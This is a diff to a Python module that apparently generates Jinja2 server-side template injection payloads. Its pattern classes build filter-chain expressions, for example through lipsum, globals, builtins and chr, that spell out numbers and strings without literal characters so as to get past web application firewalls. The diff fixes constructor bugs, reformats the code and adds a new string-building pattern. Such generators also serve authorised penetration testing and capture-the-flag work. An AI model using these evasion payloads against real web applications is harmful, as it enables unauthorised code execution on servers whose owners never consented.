@@ -2,26 +2,10 @@ from .exceptions import *
 
 import abc
 import logging
-import sys
-import random
 from functools import lru_cache
 import re
 
-logger = logging.getLogger("[SSTI Pattern]")
-
-'''
-pattern可以根据输入参数生成一个字符串
-pattern可以依赖其他pattern类型，pattern之间的依赖关系组成一棵树
-在确定了输入参数之后，pattern可以生成测试样例以供测试，测试样例是一个字符串
-pattern可以根据依赖关系生成一个列表，内容为所依赖pattern的类型，以及输入的参数
-'''
-
-'''
-
-> Bypassing the WAF without knowing WAF
->   --- Sun Tsu The art of WAF
-
-'''
+logger = logging.getLogger("pattern")
 
 vars_dict = {
     "zols": "{%set zols=lipsum|escape|urlencode|list|escape|urlencode|count%}",
@@ -60,17 +44,19 @@ def get_int_from_sum(i: int):
     利用number_dict得出可以表达数字i的表达式
     """
     d = [(k, v) for k, v in number_dict.items() if 0 < k <= i]
-    d = dict(sorted(d, key = lambda x: x[0], reverse=True))
+    d = dict(sorted(d, key=lambda x: x[0], reverse=True))
     ans = []
     for k, v in d.items():
         while k <= i:
             i -= k
             ans.append(v)
-    if i :
+    if i:
         return None
     return ans
 
+
 use_record = {}
+
 
 class BasePattern(metaclass=abc.ABCMeta):
 
@@ -86,7 +72,8 @@ class BasePattern(metaclass=abc.ABCMeta):
         chosen_pattern = {}
         for mother_pattern_class, *args in self._direct_requirements:
             subclasses = mother_pattern_class.__subclasses__()
-            subclasses = sorted(subclasses, key = lambda x: use_record.get(x, 0), reverse=True)
+            subclasses = sorted(
+                subclasses, key=lambda x: use_record.get(x, 0), reverse=True)
             for pattern_class in subclasses:
 
                 p = pattern_class(*args)
@@ -97,7 +84,8 @@ class BasePattern(metaclass=abc.ABCMeta):
                     continue
 
                 chosen_pattern[(mother_pattern_class, *args)] = p
-                use_record[pattern_class] = use_record.get(pattern_class, 0) + 1
+                use_record[pattern_class] = use_record.get(
+                    pattern_class, 0) + 1
                 logger.debug(
                     f"{self.__class__.__name__} Test {mother_pattern_class.__name__} {args} success"
                 )
@@ -204,6 +192,7 @@ class ZeroPattern3(ZeroPattern):
     def _generate(self):
         return "({}|urlencode|count)"
 
+
 class ZeroPattern4(ZeroPattern):
     def __init__(self):
         super().__init__()
@@ -211,6 +200,7 @@ class ZeroPattern4(ZeroPattern):
 
     def _generate(self):
         return "({}|int)"
+
 
 class PositiveIntPattern(BasePattern):
     pass
@@ -438,7 +428,7 @@ class AddIntPattern1(AddIntPattern):
 
 
 class AddIntPattern2(AddIntPattern):
-    def __init__(self):
+    def __init__(self, num):
         super().__init__()
         self.num = num
         self.pattern = ".__add__(%s)"
@@ -465,7 +455,7 @@ class SubIntPattern1(SubIntPattern):
 
 
 class SubIntPattern2(SubIntPattern):
-    def __init__(self):
+    def __init__(self, num):
         super().__init__()
         self.num = num
         self.pattern = ".__sub__(%s)"
@@ -506,33 +496,40 @@ class PercentSignPattern3(PercentSignPattern):
     def _generate(self):
         return "({}|escape|urlencode|first)"
 
+
 class PercentSignPattern4(PercentSignPattern):
     def __init__(self):
         super().__init__()
         self.pattern = "(lipsum[(lipsum|escape|batch(22)|list|first|last)*2+dict(globals=x)|join+(lipsum|escape|batch(22)|list|first|last)*2][(lipsum|escape|batch(22)|list|first|last)*2+dict(builtins=x)|join+(lipsum|escape|batch(22)|list|first|last)*2][dict(chr=x)|join](37))"
-        self.require(PlainPattern, self.pattern.replace("2", "").replace("37", ""))
+        self.require(PlainPattern, self.pattern.replace(
+            "2", "").replace("37", ""))
         self.require(IntPattern, 22)
         self.require(IntPattern, 2)
         self.require(IntPattern, 37)
+
     def _generate(self):
         return self.pattern\
             .replace("22", self.use(IntPattern, 22))\
             .replace("2", self.use(IntPattern, 2))\
             .replace("37", self.use(IntPattern, 37))
 
+
 class PercentSignPattern5(PercentSignPattern):
     def __init__(self):
         super().__init__()
         self.pattern = "(lipsum|attr((lipsum|escape|batch(22)|list|first|last)*2+dict(globals=x)|join+(lipsum|escape|batch(22)|list|first|last)*2)|attr((lipsum|escape|batch(22)|list|first|last)*2+dict(getitem=x)|join+(lipsum|escape|batch(22)|list|first|last)*2)((lipsum|escape|batch(22)|list|first|last)*2+dict(builtins=x)|join+(lipsum|escape|batch(22)|list|first|last)*2)|attr((lipsum|escape|batch(22)|list|first|last)*2+dict(getitem=x)|join+(lipsum|escape|batch(22)|list|first|last)*2)(dict(chr=x)|join)(37))"
-        self.require(PlainPattern, self.pattern.replace("2", "").replace("37", ""))
+        self.require(PlainPattern, self.pattern.replace(
+            "2", "").replace("37", ""))
         self.require(IntPattern, 22)
         self.require(IntPattern, 2)
         self.require(IntPattern, 37)
+
     def _generate(self):
         return self.pattern\
             .replace("22", self.use(IntPattern, 22))\
             .replace("2", self.use(IntPattern, 2))\
             .replace("37", self.use(IntPattern, 37))
+
 
 class LowerCPattern(BasePattern):
     pass
@@ -556,7 +553,8 @@ class LowerCPattern2(LowerCPattern):
     def _generate(self):
         return "dict(c={})|join".format(
             self.use(IntPattern, 1).strip("(").strip(")")
-            )
+        )
+
 
 class LowerCPattern3(LowerCPattern):
     def __init__(self):
@@ -594,6 +592,7 @@ class PercentSignLowerCPattern1(PercentSignLowerCPattern):
             self.use(LowerCPattern)
         ) + ")"
 
+
 class PercentSignLowerCPattern2(PercentSignLowerCPattern):
     def __init__(self):
         super().__init__()
@@ -611,8 +610,10 @@ class PercentSignLowerCPattern2(PercentSignLowerCPattern):
             self.use(IntPattern, 8)
         )
 
+
 class ManyPercentSignLowerCPattern(BasePattern):
     pass
+
 
 class ManyPercentSignLowerCPattern1(ManyPercentSignLowerCPattern):
     def __init__(self, num):
@@ -621,11 +622,13 @@ class ManyPercentSignLowerCPattern1(ManyPercentSignLowerCPattern):
         self.require(PercentSignLowerCPattern)
         self.require(PlainPattern, "*")
         self.require(IntPattern, num)
+
     def _generate(self):
         return "({}*{})".format(
             self.use(PercentSignLowerCPattern),
             self.use(IntPattern, self.num)
         )
+
 
 class ManyPercentSignLowerCPattern2(ManyPercentSignLowerCPattern):
     def __init__(self, num):
@@ -633,10 +636,13 @@ class ManyPercentSignLowerCPattern2(ManyPercentSignLowerCPattern):
         self.num = num
         self.require(PercentSignLowerCPattern)
         self.require(StrConcatPattern)
+
     def _generate(self):
         return "({})".format(
-            self.use(StrConcatPattern).join(self.use(PercentSignLowerCPattern) for _ in range(self.num))
+            self.use(StrConcatPattern).join(
+                self.use(PercentSignLowerCPattern) for _ in range(self.num))
         )
+
 
 class StrPattern(BasePattern):
     pass
@@ -759,6 +765,7 @@ class StrPattern08(StrPattern):
             self.use(IntPattern, 1)
         )
 
+
 class StrPattern09(StrPattern):
     def __init__(self, inner_s):
         super().__init__()
@@ -807,7 +814,30 @@ class StrPattern10(StrPattern):
 
 class StrPattern11(StrPattern):
     def __init__(self, inner_s):
-        from urllib.parse import quote
+        super().__init__()
+        if not re.match("^[a-zA-Z_][a-zA-Z0-9_]*$", inner_s):
+            self.require(WillErrorPattern)
+            return
+
+        l = [
+            "(()|select|string|batch({TWENTYFIVE})|first|last)" if not word else f"dict({word}=cycler)|join"
+            for word in inner_s.split("_")
+        ]
+
+        self.l = l
+
+        self.require(StrConcatPattern)
+        self.require(IntPattern, 25)
+
+    def _generate(self):
+        return self\
+            .use(StrConcatPattern)\
+            .join(self.l)\
+            .replace("{TWENTYFIVE}", self.use(IntPattern, 25))
+
+
+class StrPattern12(StrPattern):
+    def __init__(self, inner_s):
         super().__init__()
         self.inner_s = "".join("\\u00" + hex(ord(c))[2:] for c in inner_s)
         self.require(PlainPattern, self.inner_s)
@@ -816,9 +846,9 @@ class StrPattern11(StrPattern):
     def _generate(self):
         return '"' + self.inner_s + '"'
 
-class StrPattern12(StrPattern):
+
+class StrPattern13(StrPattern):
     def __init__(self, inner_s):
-        from urllib.parse import quote
         super().__init__()
         self.inner_s = "".join("\\u00" + hex(ord(c))[2:] for c in inner_s)
         self.require(PlainPattern, self.inner_s)
@@ -827,7 +857,8 @@ class StrPattern12(StrPattern):
     def _generate(self):
         return "'" + self.inner_s + "'"
 
-class StrPattern13(StrPattern):
+
+class StrPattern14(StrPattern):
     def __init__(self, inner_s):
         super().__init__()
 
@@ -861,7 +892,8 @@ class StrPattern13(StrPattern):
             numbers
         )
 
-class StrPattern14(StrPattern):
+
+class StrPattern15(StrPattern):
     def __init__(self, inner_s):
         super().__init__()
 
@@ -1020,7 +1052,8 @@ class ConcatedAttrItemPattern1(ConcatedAttrItemPattern):
             inside = self.use(PlainPattern, self.inside)
         elif isinstance(self.inside, tuple):
             inside = self.use(self.inside[0], *self.inside[1:])
-
+        else:
+            raise Exception("Unknown Error")
         s = inside
         c = ""
         for PatternType, *args in self.tp:
